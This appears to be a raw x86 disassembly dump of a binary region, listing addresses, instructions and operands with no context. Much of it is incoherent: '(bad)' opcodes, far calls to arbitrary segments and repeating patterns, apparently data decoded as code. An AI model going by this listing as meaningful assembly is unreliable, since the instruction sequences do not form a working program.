  43047d:	bound  esp,QWORD PTR [edx+0x62]
  430480:	or     eax,0x6262f7e2
  430485:	bound  esp,QWORD PTR [ecx]
  430487:	popa   
  430488:	in     eax,dx
  430489:	push   ebp
  43048a:	(bad)  
  43048b:	ins    DWORD PTR es:[edi],dx
  43048c:	(bad)  
  43048d:	jmp    0x936d:0x8f55ed5d
  430494:	loop   0x430468
  430496:	push   0x5bd86161
  43049b:	jmp    0x430500
  43049d:	bound  esp,QWORD PTR [edx+0x61]
  4304a0:	and    edx,esp
  4304a2:	out    0x63,eax
  4304a4:	bound  esp,QWORD PTR [edx-0x10]
  4304a7:	inc    ebx
  4304a8:	xor    al,0x3a
  4304aa:	adc    al,0xe8
  4304ac:	int3   
  4304ad:	popa   
  4304ae:	popa   
  4304af:	xchg   esp,eax
  4304b0:	pop    ss
  4304b1:	loop   0x430492
  4304b3:	arpl   WORD PTR [edx+0x62],sp
  4304b6:	adc    al,0x34
  4304b8:	int3   
  4304b9:	popa   
  4304ba:	popa   
  4304bb:	xchg   esp,eax
  4304bc:	pop    ss
  4304bd:	loop   0x43049c
  4304bf:	arpl   WORD PTR [edx+0x62],sp
  4304c2:	adc    al,0xe3
  4304c4:	int3   
  4304c5:	popa   
  4304c6:	popa   
  4304c7:	xchg   esp,eax
  4304c8:	pop    ss
  4304c9:	loop   0x4304a6
  4304cb:	arpl   WORD PTR [edx+0x62],sp
  4304ce:	adc    al,0xa7
  4304d0:	int3   
  4304d1:	popa   
  4304d2:	popa   
  4304d3:	xchg   esp,eax
  4304d4:	pop    ss
  4304d5:	loop   0x4304b0
  4304d7:	arpl   WORD PTR [edx+0x62],sp
  4304da:	adc    al,0xe1
  4304dc:	int3   
  4304dd:	popa   
  4304de:	popa   
  4304df:	xchg   esp,eax
  4304e0:	pop    ss
  4304e1:	loop   0x430551
  4304e3:	arpl   WORD PTR [edx+0x62],sp
  4304e6:	adc    al,0xa3
  4304e8:	int3   
  4304e9:	popa   
  4304ea:	popa   
  4304eb:	xchg   esp,eax
  4304ec:	pop    ss
  4304ed:	loop   0x4304a4
  4304ef:	arpl   WORD PTR [edx+0x62],sp
  4304f2:	adc    al,0xf
  4304f4:	shl    DWORD PTR [ecx+0x61],cl
  4304f7:	xchg   esp,eax
  4304f8:	pop    ss
  4304f9:	loop   0x4304ff
  4304fb:	arpl   WORD PTR [edx+0x62],sp
  4304fe:	adc    al,0x96
  430500:	int3   
  430501:	popa   
  430502:	popa   
  430503:	xchg   esp,eax
  430504:	pop    ss
  430505:	loop   0x430521
  430507:	arpl   WORD PTR [edx+0x62],sp
  43050a:	adc    al,0xe6
  43050c:	int3   
  43050d:	popa   
  43050e:	popa   
  43050f:	xchg   esp,eax
  430510:	pop    ss
  430511:	loop   0x430523
  430513:	arpl   WORD PTR [edx+0x62],sp
  430516:	adc    al,0x72
  430518:	int3   
  430519:	popa   
  43051a:	popa   
  43051b:	xchg   esp,eax
  43051c:	pop    ss
  43051d:	loop   0x43052d
  43051f:	arpl   WORD PTR [edx+0x62],sp
  430522:	adc    al,0x34
  430524:	int3   
  430525:	popa   
  430526:	popa   
  430527:	xchg   esp,eax
  430528:	pop    ss
  430529:	loop   0x430537
  43052b:	arpl   WORD PTR [edx+0x62],sp
  43052e:	adc    al,0xa9
  430530:	int3   
  430531:	popa   
  430532:	popa   
  430533:	xchg   esp,eax
  430534:	pop    ss
  430535:	loop   0x430549
  430537:	arpl   WORD PTR [edx+0x62],sp
  43053a:	adc    al,0xcc
  43053c:	mul    DWORD PTR [ecx+0x61]
  43053f:	xchg   esp,eax
  430540:	pop    ss
  430541:	loop   0x43052c
  430543:	arpl   WORD PTR [edx+0x62],sp
  430546:	adc    al,0xdc
  430548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430549:	popa   
  43054a:	popa   
  43054b:	xchg   esp,eax
  43054c:	pop    ss
  43054d:	loop   0x43053e
  43054f:	arpl   WORD PTR [edx+0x62],sp
  430552:	adc    al,0x83
  430554:	mov    ecx,0x17946161
  430559:	loop   0x430550
  43055b:	arpl   WORD PTR [edx+0x62],sp
  43055e:	adc    al,0xec
  430560:	outs   dx,DWORD PTR ds:[esi]
  430561:	popa   
  430562:	popa   
  430563:	xchg   esp,eax
  430564:	pop    ss
  430565:	loop   0x430571
  430567:	arpl   WORD PTR [edx+0x62],sp
  43056a:	adc    al,0xa3
  43056c:	int3   
  43056d:	popa   
  43056e:	popa   
  43056f:	xchg   esp,eax
  430570:	pop    ss
  430571:	loop   0x430574
  430573:	arpl   WORD PTR [edx+0x62],sp
  430576:	or     eax,0xb858675
  43057b:	call   0xa8e8:0x5e343ac9
  430582:	popa   
  430583:	pop    ss
  430584:	loop   0x43059a
  430586:	arpl   WORD PTR [edx+0x62],sp
  430589:	or     eax,0xb859a75
  43058e:	call   0x24e2:0x6e213ac9
  430595:	dec    esi
  430596:	push   edi
  430597:	popa   
  430598:	bound  esp,QWORD PTR [edx+0x61]
  43059b:	popa   
  43059c:	adc    esp,edx
  43059e:	adc    al,0x63
  4305a0:	bound  esp,QWORD PTR [edx-0x2e]
  4305a3:	or     eax,0xb858675
  4305a8:	call   0xa8e8:0x5e343ac9
  4305af:	popa   
  4305b0:	rcl    BYTE PTR [ebx],cl
  4305b2:	loop   0x430593
  4305b4:	arpl   WORD PTR [edx+0x62],sp
  4305b7:	ror    BYTE PTR ds:0x6262e7e2,cl
  4305bd:	bound  ecx,QWORD PTR ds:0x6168f5db
  4305c3:	popa   
  4305c4:	bound  esi,QWORD PTR [edx+0xd]
  4305c7:	jne    0x43055b
  4305c9:	bound  ebx,QWORD PTR [eax+0x17]
  4305cc:	loop   0x4305b1
  4305ce:	arpl   WORD PTR [edx+0x62],sp
  4305d1:	fsub   DWORD PTR [ebx]
  4305d3:	jecxz  0x430638
  4305d5:	bound  esp,QWORD PTR [edx+0x61]
  4305d8:	out    0x93,eax
  4305da:	clc    
  4305db:	cmp    al,0x76
  4305dd:	test   DWORD PTR [ebp+eax*4+0x98b9759],0xf7763cf6
  4305e8:	mov    WORD PTR ds:0x6262e7e2,cs
  4305ee:	bound  ecx,QWORD PTR ds:0x616810db
  4305f4:	popa   
  4305f5:	or     eax,0x6fd69acd
  4305fa:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430600:	pop    esi
  430601:	call   0x9ae467ae
  430606:	xchg   ebx,eax
  430607:	loop   0x43063d
  430609:	xor    al,0x61
  43060b:	popa   
  43060c:	or     eax,0xb859a75
  430611:	call   0xa8e8:0x5e343ac9
  430618:	popa   
  430619:	or     eax,0x6262e713
  43061e:	bound  ecx,QWORD PTR ds:0x6168df17
  430624:	popa   
  430625:	pop    ss
  430626:	push   0x859a750d
  43062b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430631:	call   0x135067de
  430636:	out    0x62,eax
  430638:	bound  esp,QWORD PTR [edx+0xd]
  43063b:	pop    ss
  43063c:	fld    TBYTE PTR [eax+0x61]
  43063f:	popa   
  430640:	pop    ss
  430641:	push   0x63bee2ff
  430646:	bound  esp,QWORD PTR [edx-0xd]
  430649:	jmp    edx
  43064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43064c:	arpl   WORD PTR [edx+0x62],sp
  43064f:	xor    eax,0x63a4e2ff
  430654:	bound  esp,QWORD PTR [edx-0x3e]
  430657:	jmp    edx
  430659:	retf   
  43065a:	arpl   WORD PTR [edx+0x62],sp
  43065d:	fs jmp edx
  430660:	retf   0x6263
  430663:	bound  edi,QWORD PTR [esi]
  430665:	jmp    edx
  430667:	shl    DWORD PTR [ebx+0x62],0x62
  43066b:	out    dx,al
  43066c:	jmp    edx
  43066e:	shl    BYTE PTR [ebx+0x62],0x62
  430672:	ss jmp edx
  430675:	(bad)  
  430676:	arpl   WORD PTR [edx+0x62],sp
  430679:	loopne 0x43068f
  43067b:	jp     0x430649
  43067d:	popa   
  43067e:	popa   
  43067f:	xchg   esp,eax
  430680:	pop    ss
  430681:	loop   0x4306cf
  430683:	pop    esp
  430684:	bound  esp,QWORD PTR [edx+0x14]
  430687:	xor    al,0xcc
  430689:	popa   
  43068a:	popa   
  43068b:	xchg   esp,eax
  43068c:	pop    ss
  43068d:	loop   0x4306e1
  43068f:	pop    esp
  430690:	bound  esp,QWORD PTR [edx+0x14]
  430693:	jecxz  0x430661
  430695:	popa   
  430696:	popa   
  430697:	xchg   esp,eax
  430698:	pop    ss
  430699:	loop   0x4306f3
  43069b:	pop    esp
  43069c:	bound  esp,QWORD PTR [edx+0x14]
  43069f:	stos   BYTE PTR es:[edi],al
  4306a0:	int3   
  4306a1:	popa   
  4306a2:	popa   
  4306a3:	xchg   esp,eax
  4306a4:	pop    ss
  4306a5:	loop   0x4306ed
  4306a7:	pop    esp
  4306a8:	bound  esp,QWORD PTR [edx+0x14]
  4306ab:	in     al,0xd3
  4306ad:	popa   
  4306ae:	popa   
  4306af:	xchg   esp,eax
  4306b0:	pop    ss
  4306b1:	loop   0x4306db
  4306b3:	pop    esp
  4306b4:	bound  esp,QWORD PTR [edx+0x14]
  4306b7:	mov    eax,ds:0x946161cc
  4306bc:	pop    ss
  4306bd:	loop   0x4306e5
  4306bf:	pop    esp
  4306c0:	bound  esp,QWORD PTR [edx+0x14]
  4306c3:	loope  0x430691
  4306c5:	popa   
  4306c6:	popa   
  4306c7:	xchg   esp,eax
  4306c8:	pop    ss
  4306c9:	loop   0x43071b
  4306cb:	pop    esp
  4306cc:	bound  esp,QWORD PTR [edx+0x14]
  4306cf:	mov    ds:0x946161cc,eax
  4306d4:	pop    ss
  4306d5:	loop   0x430715
  4306d7:	pop    esp
  4306d8:	bound  esp,QWORD PTR [edx+0x14]
  4306db:	xor    al,0xcc
  4306dd:	popa   
  4306de:	popa   
  4306df:	xchg   esp,eax
  4306e0:	pop    ss
  4306e1:	loop   0x43071f
  4306e3:	pop    esp
  4306e4:	bound  esp,QWORD PTR [edx+0x14]
  4306e7:	xchg   esi,eax
  4306e8:	int3   
  4306e9:	popa   
  4306ea:	popa   
  4306eb:	xchg   esp,eax
  4306ec:	pop    ss
  4306ed:	loop   0x430731
  4306ef:	pop    esp
  4306f0:	bound  esp,QWORD PTR [edx+0x14]
  4306f3:	imul   eax,DWORD PTR [eax],0x17946161
  4306f9:	loop   0x430743
  4306fb:	pop    esp
  4306fc:	bound  esp,QWORD PTR [edx+0x14]
  4306ff:	in     eax,0x13
  430701:	popa   
  430702:	popa   
  430703:	xchg   esp,eax
  430704:	pop    ss
  430705:	loop   0x43073d
  430707:	pop    esp
  430708:	bound  esp,QWORD PTR [edx+0x14]
  43070b:	jo     0x430733
  43070d:	popa   
  43070e:	popa   
  43070f:	xchg   esp,eax
  430710:	pop    ss
  430711:	loop   0x43072b
  430713:	pop    esp
  430714:	bound  esp,QWORD PTR [edx+0x14]
  430717:	push   cs
  430718:	push   ecx
  430719:	popa   
  43071a:	popa   
  43071b:	xchg   esp,eax
  43071c:	pop    ss
  43071d:	loop   0x430735
  43071f:	pop    esp
  430720:	bound  esp,QWORD PTR [edx+0x14]
  430723:	sbb    DWORD PTR [edx],eax
  430725:	popa   
  430726:	popa   
  430727:	xchg   esp,eax
  430728:	pop    ss
  430729:	loop   0x43071e
  43072b:	pop    esp
  43072c:	bound  esp,QWORD PTR [edx+0x14]
  43072f:	sbb    DWORD PTR [ebx+0x17946161],ebx
  430735:	loop   0x430728
  430737:	pop    esp
  430738:	bound  esp,QWORD PTR [edx+0x14]
  43073b:	pushf  
  43073c:	int3   
  43073d:	popa   
  43073e:	popa   
  43073f:	xchg   esp,eax
  430740:	pop    ss
  430741:	loop   0x4307a7
  430743:	pop    esp
  430744:	bound  esp,QWORD PTR [edx+0x14]
  430747:	jp     0x430715
  430749:	popa   
  43074a:	popa   
  43074b:	xchg   esp,eax
  43074c:	pop    ss
  43074d:	loop   0x4307c5
  43074f:	arpl   WORD PTR [edx+0x62],sp
  430752:	adc    al,0x34
  430754:	int3   
  430755:	popa   
  430756:	popa   
  430757:	xchg   esp,eax
  430758:	pop    ss
  430759:	loop   0x4307d7
  43075b:	arpl   WORD PTR [edx+0x62],sp
  43075e:	adc    al,0xe3
  430760:	int3   
  430761:	popa   
  430762:	popa   
  430763:	xchg   esp,eax
  430764:	pop    ss
  430765:	loop   0x430762
  430767:	arpl   WORD PTR [edx+0x62],sp
  43076a:	adc    al,0xaa
  43076c:	int3   
  43076d:	popa   
  43076e:	popa   
  43076f:	xchg   esp,eax
  430770:	pop    ss
  430771:	loop   0x4307eb
  430773:	arpl   WORD PTR [edx+0x62],sp
  430776:	adc    al,0xe4
  430778:	shl    DWORD PTR [ecx+0x61],cl
  43077b:	xchg   esp,eax
  43077c:	pop    ss
  43077d:	loop   0x43070d
  43077f:	arpl   WORD PTR [edx+0x62],sp
  430782:	adc    al,0xa1
  430784:	int3   
  430785:	popa   
  430786:	popa   
  430787:	xchg   esp,eax
  430788:	pop    ss
  430789:	loop   0x43075f
  43078b:	arpl   WORD PTR [edx+0x62],sp
  43078e:	adc    al,0xe6
  430790:	int3   
  430791:	popa   
  430792:	popa   
  430793:	xchg   esp,eax
  430794:	pop    ss
  430795:	loop   0x4307cf
  430797:	arpl   WORD PTR [edx+0x62],sp
  43079a:	adc    al,0xa3
  43079c:	int3   
  43079d:	popa   
  43079e:	popa   
  43079f:	xchg   esp,eax
  4307a0:	pop    ss
  4307a1:	loop   0x4307d1
  4307a3:	arpl   WORD PTR [edx+0x62],sp
  4307a6:	adc    al,0x34
  4307a8:	int3   
  4307a9:	popa   
  4307aa:	popa   
  4307ab:	xchg   esp,eax
  4307ac:	pop    ss
  4307ad:	loop   0x430755
  4307af:	arpl   WORD PTR [edx+0x62],sp
  4307b2:	adc    al,0x96
  4307b4:	int3   
  4307b5:	popa   
  4307b6:	popa   
  4307b7:	xchg   esp,eax
  4307b8:	pop    ss
  4307b9:	loop   0x4307ed
  4307bb:	arpl   WORD PTR [edx+0x62],sp
  4307be:	adc    al,0x69
  4307c0:	add    BYTE PTR [ecx+0x61],ah
  4307c3:	xchg   esp,eax
  4307c4:	pop    ss
  4307c5:	loop   0x430839
  4307c7:	arpl   WORD PTR [edx+0x62],sp
  4307ca:	adc    al,0xe5
  4307cc:	adc    esp,DWORD PTR [ecx+0x61]
  4307cf:	xchg   esp,eax
  4307d0:	pop    ss
  4307d1:	loop   0x43077b
  4307d3:	arpl   WORD PTR [edx+0x62],sp
  4307d6:	adc    al,0x70
  4307d8:	es popa 
  4307da:	popa   
  4307db:	xchg   esp,eax
  4307dc:	pop    ss
  4307dd:	loop   0x43077d
  4307df:	arpl   WORD PTR [edx+0x62],sp
  4307e2:	adc    al,0xe
  4307e4:	push   ecx
  4307e5:	popa   
  4307e6:	popa   
  4307e7:	xchg   esp,eax
  4307e8:	pop    ss
  4307e9:	loop   0x43076f
  4307eb:	arpl   WORD PTR [edx+0x62],sp
  4307ee:	adc    al,0x19
  4307f0:	add    ah,BYTE PTR [ecx+0x61]
  4307f3:	xchg   esp,eax
  4307f4:	pop    ss
  4307f5:	loop   0x4307a1
  4307f7:	arpl   WORD PTR [edx+0x62],sp
  4307fa:	adc    al,0x19
  4307fc:	fwait
  4307fd:	popa   
  4307fe:	popa   
  4307ff:	xchg   esp,eax
  430800:	pop    ss
  430801:	loop   0x4307a3
  430803:	arpl   WORD PTR [edx+0x62],sp
  430806:	adc    al,0x9c
  430808:	int3   
  430809:	popa   
  43080a:	popa   
  43080b:	xchg   esp,eax
  43080c:	pop    ss
  43080d:	loop   0x4307a5
  43080f:	arpl   WORD PTR [edx+0x62],sp
  430812:	or     eax,0xb858675
  430817:	call   0xa8e8:0x5e343ac9
  43081e:	popa   
  43081f:	pop    ss
  430820:	loop   0x430882
  430822:	pop    esp
  430823:	bound  esp,QWORD PTR [edx-0x12]
  430826:	xchg   DWORD PTR ds:0xb858675,ecx
  43082c:	call   0x5c60:0x130d3ac9
  430833:	bound  esp,QWORD PTR [edx+0x13]
  430836:	outs   dx,BYTE PTR ds:[esi]
  430837:	push   0x61a8e85e
  43083c:	pop    ss
  43083d:	loop   0x43089f
  43083f:	pop    esp
  430840:	bound  esp,QWORD PTR [edx+0xd]
  430843:	jne    0x4307cb
  430845:	test   DWORD PTR [ebx],ecx
  430847:	call   0xa873:0x56343ac9
  43084e:	popa   
  43084f:	mov    eax,ds:0x625c60e2
  430854:	bound  esi,QWORD PTR [ebx+0x75]
  430857:	or     eax,0xb858675
  43085c:	call   0xa8e8:0x5e343ac9
  430863:	popa   
  430864:	or     eax,0x625c6013
  430869:	bound  ebp,QWORD PTR ds:0x6e069360
  43086f:	lea    edi,[esi-0x7a9d9d9d]
  430875:	fsub   DWORD PTR [ecx+0x61]
  430878:	popa   
  430879:	fcomp  DWORD PTR [edx+ebx*4]
  43087c:	or     eax,0x6fd686cd
  430881:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430887:	pop    esi
  430888:	call   0xe4506a35
  43088d:	pusha  
  43088e:	pop    esp
  43088f:	bound  esp,QWORD PTR [edx+0x2d]
  430892:	dec    edi
  430893:	add    al,0x6e
  430895:	imul   edi,DWORD PTR [esi-0x119d9d9d],0xd
  43089c:	or     eax,0xb858675
  4308a1:	call   0xa8e8:0x5e343ac9
  4308a8:	popa   
  4308a9:	pop    ss
  4308aa:	loop   0x4308c0
  4308ac:	arpl   WORD PTR [edx+0x62],sp
  4308af:	or     eax,0xb859a75
  4308b4:	call   0x63be:0x13133ac9
  4308bb:	bound  esp,QWORD PTR [edx+0x17]
  4308be:	adc    dl,ah
  4308c0:	and    al,0x4e
  4308c2:	push   edi
  4308c3:	popa   
  4308c4:	fcomp  DWORD PTR [ebx+0x31]
  4308c7:	pop    esp
  4308c8:	bound  esp,QWORD PTR [edx+0x61]
  4308cb:	adc    al,0x71
  4308cd:	int3   
  4308ce:	popa   
  4308cf:	popa   
  4308d0:	xchg   esp,eax
  4308d1:	pop    ss
  4308d2:	loop   0x430931
  4308d4:	pop    esp
  4308d5:	bound  esp,QWORD PTR [edx+0x14]
  4308d8:	(bad)
  4308db:	popa   
  4308dc:	xchg   esp,eax
  4308dd:	pop    ss
  4308de:	loop   0x43092b
  4308e0:	pop    esp
  4308e1:	bound  esp,QWORD PTR [edx+0x14]
  4308e4:	pop    es
  4308e5:	shl    DWORD PTR [ecx+0x61],cl
  4308e8:	xchg   esp,eax
  4308e9:	pop    ss
  4308ea:	loop   0x430955
  4308ec:	pop    esp
  4308ed:	bound  esp,QWORD PTR [edx+0x14]
  4308f0:	out    dx,eax
  4308f1:	shl    DWORD PTR [ecx+0x61],cl
  4308f4:	xchg   esp,eax
  4308f5:	pop    ss
  4308f6:	loop   0x43095f
  4308f8:	pop    esp
  4308f9:	bound  esp,QWORD PTR [edx+0x14]
  4308fc:	jmp    0x94a46ad4
  430901:	pop    ss
  430902:	loop   0x430959
  430904:	pop    esp
  430905:	bound  esp,QWORD PTR [edx+0x14]
  430908:	or     eax,0x946161d3
  43090d:	pop    ss
  43090e:	loop   0x430973
  430910:	pop    esp
  430911:	bound  esp,QWORD PTR [edx+0x14]
  430914:	(bad)  
  430916:	popa   
  430917:	popa   
  430918:	xchg   esp,eax
  430919:	pop    ss
  43091a:	loop   0x43097d
  43091c:	arpl   WORD PTR [edx+0x62],sp
  43091f:	adc    al,0x71
  430921:	int3   
  430922:	popa   
  430923:	popa   
  430924:	xchg   esp,eax
  430925:	pop    ss
  430926:	loop   0x430987
  430928:	arpl   WORD PTR [edx+0x62],sp
  43092b:	adc    al,0x34
  43092d:	int3   
  43092e:	popa   
  43092f:	popa   
  430930:	xchg   esp,eax
  430931:	pop    ss
  430932:	loop   0x43092b
  430934:	arpl   WORD PTR [edx+0x62],sp
  430937:	adc    al,0x13
  430939:	shl    DWORD PTR [ecx+0x61],cl
  43093c:	xchg   esp,eax
  43093d:	pop    ss
  43093e:	loop   0x4308e2
  430940:	arpl   WORD PTR [edx+0x62],sp
  430943:	adc    al,0xc5
  430945:	int3   
  430946:	popa   
  430947:	popa   
  430948:	xchg   esp,eax
  430949:	pop    ss
  43094a:	loop   0x4308e4
  43094c:	arpl   WORD PTR [edx+0x62],sp
  43094f:	adc    al,0xdd
  430951:	int3   
  430952:	popa   
  430953:	popa   
  430954:	xchg   esp,eax
  430955:	pop    ss
  430956:	loop   0x430984
  430958:	arpl   WORD PTR [edx+0x62],sp
  43095b:	adc    al,0xc5
  43095d:	int3   
  43095e:	popa   
  43095f:	popa   
  430960:	xchg   esp,eax
  430961:	pop    ss
  430962:	loop   0x4309d8
  430964:	arpl   WORD PTR [edx+0x62],sp
  430967:	adc    al,0xe7
  430969:	int3   
  43096a:	popa   
  43096b:	popa   
  43096c:	xchg   esp,eax
  43096d:	pop    ss
  43096e:	loop   0x43094a
  430970:	arpl   WORD PTR [edx+0x62],sp
  430973:	adc    al,0x7b
  430975:	int3   
  430976:	popa   
  430977:	popa   
  430978:	xchg   esp,eax
  430979:	pop    ss
  43097a:	loop   0x43094c
  43097c:	arpl   WORD PTR [edx+0x62],sp
  43097f:	adc    al,0xb8
  430981:	int3   
  430982:	popa   
  430983:	popa   
  430984:	xchg   esp,eax
  430985:	pop    ss
  430986:	loop   0x43094e
  430988:	arpl   WORD PTR [edx+0x62],sp
  43098b:	adc    al,0x13
  43098d:	shl    DWORD PTR [ecx+0x61],cl
  430990:	xchg   esp,eax
  430991:	pop    ss
  430992:	loop   0x430960
  430994:	arpl   WORD PTR [edx+0x62],sp
  430997:	adc    al,0x34
  430999:	int3   
  43099a:	popa   
  43099b:	popa   
  43099c:	xchg   esp,eax
  43099d:	pop    ss
  43099e:	loop   0x430972
  4309a0:	arpl   WORD PTR [edx+0x62],sp
  4309a3:	or     eax,0xb859a75
  4309a8:	call   0x8475:0x6e133ac9
  4309af:	sbb    dh,cl
  4309b1:	popa   
  4309b2:	pop    ss
  4309b3:	loop   0x4309d1
  4309b5:	pop    esp
  4309b6:	bound  esp,QWORD PTR [edx+0xd]
  4309b9:	jne    0x430955
  4309bb:	test   DWORD PTR [ebx],ecx
  4309bd:	call   0xa8e8:0x5e343ac9
  4309c4:	popa   
  4309c5:	or     eax,0x625c1c13
  4309ca:	bound  edx,QWORD PTR [ebx+0x60af91f2]
  4309d0:	or     eax,0x625c1ce2
  4309d5:	bound  edx,QWORD PTR [edi+edx*1-0x658af266]
  4309dc:	test   DWORD PTR [ebx],ecx
  4309de:	call   0xf175:0x6e133ac9
  4309e5:	xor    eax,0xe21761ce
  4309ea:	and    BYTE PTR [edx+eiz*2+0x62],bl
  4309ee:	or     eax,0xb859a75
  4309f3:	call   0xa8e8:0x5e343ac9
  4309fa:	popa   
  4309fb:	or     eax,0x625c2013
  430a00:	bound  edx,QWORD PTR [ebx+0x60af91f2]
  430a06:	or     eax,0x625c20e2
  430a0b:	bound  edx,QWORD PTR [edi+edx*1-0x658af266]
  430a12:	test   DWORD PTR [ebx],ecx
  430a14:	call   0xa8e8:0x5e343ac9
  430a1b:	popa   
  430a1c:	or     eax,0x6fd69acd
  430a21:	or     ebx,DWORD PTR [edx+0x17943ac9]
  430a27:	outs   dx,BYTE PTR ds:[esi]
  430a28:	int    0xc8
  430a2a:	sbb    dh,cl
  430a2c:	popa   
  430a2d:	or     eax,0xb859a75
  430a32:	call   0xa8e8:0x5e343ac9
  430a39:	popa   
  430a3a:	or     eax,0x6fd69acd
  430a3f:	or     ebx,DWORD PTR [edx+0x17943ac9]
  430a45:	outs   dx,BYTE PTR ds:[esi]
  430a46:	int    0x63
  430a48:	xor    eax,0x750d61ce
  430a4d:	xchg   BYTE PTR [ebp+0x3ac99a0b],al
  430a53:	or     eax,0x6fd686cd
  430a58:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  430a5e:	call   0xe217:0x61ce1b4b
  430a65:	adc    al,0x63
  430a67:	bound  esp,QWORD PTR [edx+0xd]
  430a6a:	jne    0x430a06
  430a6c:	test   DWORD PTR [ebx],ecx
  430a6e:	call   0x63b6:0x13133ac9
  430a75:	bound  esp,QWORD PTR [edx+0x17]
  430a78:	adc    dl,ah
  430a7a:	and    al,0x4e
  430a7c:	push   edi
  430a7d:	popa   
  430a7e:	jo     0x430ae1
  430a80:	bound  esi,QWORD PTR [edx-0x5d1dec72]
  430a86:	arpl   WORD PTR [edx+0x62],sp
  430a89:	shl    bl,cl
  430a8b:	jp     0x430a55
  430a8d:	popa   
  430a8e:	popa   
  430a8f:	or     eax,0x6fd686cd
  430a94:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  430a9a:	adc    esp,DWORD PTR [esi+ecx*2]
  430a9d:	push   edi
  430a9e:	popa   
  430a9f:	or     eax,0xb859a75
  430aa4:	call   0xa8e8:0x5e343ac9
  430aab:	popa   
  430aac:	mov    eax,ds:0x625c31e2
  430ab1:	(bad)  
  430ab2:	out    0x2,eax
  430ab4:	adc    esp,edx
  430ab6:	adc    al,0x63
  430ab8:	bound  esp,QWORD PTR [edx-0x2e]
  430abb:	or     eax,0xb858675
  430ac0:	call   0xa8e8:0x5e343ac9
  430ac7:	popa   
  430ac8:	rcl    BYTE PTR [ebx],cl
  430aca:	loop   0x430b42
  430acc:	arpl   WORD PTR [edx+0x62],sp
  430acf:	shl    BYTE PTR [edx+0xb],cl
  430ad2:	xor    DWORD PTR [edx+eiz*2+0x62],ebx
  430ad6:	or     eax,0x58629275
  430adb:	or     eax,0xb859a75
  430ae0:	call   0x639a:0x13133ac9
  430ae7:	bound  esp,QWORD PTR [edx+0x17]
  430aea:	adc    dl,ah
  430aec:	and    al,0x4e
  430aee:	push   edi
  430aef:	popa   
  430af0:	jo     0x430b53
  430af2:	bound  esi,QWORD PTR [edx+0x5de2138e]
  430af8:	pop    esp
  430af9:	bound  esp,QWORD PTR [edx-0x2e]
  430afc:	repz dec ebx
  430afe:	leave  
  430aff:	popa   
  430b00:	popa   
  430b01:	or     eax,0x6fd686cd
  430b06:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  430b0c:	adc    esp,DWORD PTR [esi+ecx*2]
  430b0f:	push   edi
  430b10:	popa   
  430b11:	adc    esp,edx
  430b13:	fbld   TBYTE PTR [edx+0x62]
  430b16:	bound  edx,QWORD PTR [edi]
  430b18:	loop   0x430b22
  430b1a:	arpl   WORD PTR [edx+0x62],sp
  430b1d:	bound  ecx,QWORD PTR [ebx]
  430b1f:	out    0x62,eax
  430b21:	bound  esp,QWORD PTR [edx+0x62]
  430b24:	mov    dl,0xfb
  430b26:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  430b2c:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  430b32:	bound  esi,QWORD PTR [edx-0x794d9d66]
  430b38:	repz dec ebx
  430b3a:	xor    esp,DWORD PTR [ecx+0x61]
  430b3d:	or     eax,0x62630813
  430b42:	bound  edx,QWORD PTR [edi]
  430b44:	push   0x859a750d
  430b49:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430b4f:	call   0xe2ea6cfc
  430b54:	fbld   TBYTE PTR [edx+0x62]
  430b57:	bound  edx,QWORD PTR [ebx+0x61610e6e]
  430b5d:	popa   
  430b5e:	adc    esi,DWORD PTR [ebp-0x9]
  430b61:	pop    ss
  430b62:	loop   0x430b5d
  430b64:	pop    esp
  430b65:	bound  esp,QWORD PTR [edx+0xd]
  430b68:	loop   0x430b51
  430b6a:	bound  esp,QWORD PTR [edx+0x62]
  430b6d:	push   esi
  430b6e:	loop   0x430b4f
  430b70:	bound  esp,QWORD PTR [edx+0x62]
  430b73:	pop    ss
  430b74:	loop   0x430b5d
  430b76:	bound  esp,QWORD PTR [edx+0x62]
  430b79:	bound  ecx,QWORD PTR [ebx]
  430b7b:	out    0x62,eax
  430b7d:	bound  esp,QWORD PTR [edx-0xd]
  430b80:	aaa    
  430b81:	cmp    ah,BYTE PTR [ecx+0x61]
  430b84:	or     eax,0xb859a75
  430b89:	call   0xa8e8:0x5e343ac9
  430b90:	popa   
  430b91:	or     eax,0x6262e713
  430b96:	bound  ecx,QWORD PTR ds:0x61686017
  430b9c:	popa   
  430b9d:	or     eax,0xb6fd691
  430ba2:	call   0xe85e:0x1fd63ac9
  430ba9:	test   al,0x61
  430bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430bac:	pop    ds
  430bad:	mov    dl,0x83
  430baf:	or     eax,0x6262e7e2
  430bb4:	bound  ecx,QWORD PTR ds:0x61684cdb
  430bba:	popa   
  430bbb:	bound  esi,QWORD PTR [edx+0xd]
  430bbe:	loop   0x430ba7
  430bc0:	bound  esp,QWORD PTR [edx+0x62]
  430bc3:	or     eax,0x616848db
  430bc8:	popa   
  430bc9:	(bad)  
  430bcb:	cmp    dh,ch
  430bcd:	jl     0x430bdc
  430bcf:	loop   0x430bb8
  430bd1:	bound  esp,QWORD PTR [edx+0x62]
  430bd4:	or     eax,0x6168dfdb
  430bd9:	popa   
  430bda:	or     eax,0x625cf913
  430bdf:	bound  ecx,QWORD PTR ds:0xd9a5691
  430be5:	loop   0x430be0
  430be7:	pop    esp
  430be8:	bound  esp,QWORD PTR [edx+0x17]
  430beb:	call   0x6262:0x62e7e20d
  430bf2:	xor    al,0x3c
  430bf4:	push   0xe2176161
  430bf9:	adc    al,0x5c
  430bfb:	bound  esp,QWORD PTR [edx+0xd]
  430bfe:	loop   0x430c14
  430c00:	pop    esp
  430c01:	bound  esp,QWORD PTR [edx+0xd]
  430c04:	popa   
  430c05:	or     eax,0xe217da61
  430c0a:	or     BYTE PTR [edx+eiz*2+0x62],bl
  430c0e:	or     eax,0x625c14e2
  430c13:	bound  ecx,QWORD PTR ds:0x8130d61
  430c19:	pop    esp
  430c1a:	bound  esp,QWORD PTR [edx+0x17]
  430c1d:	call   0x6262:0x62e7e20d
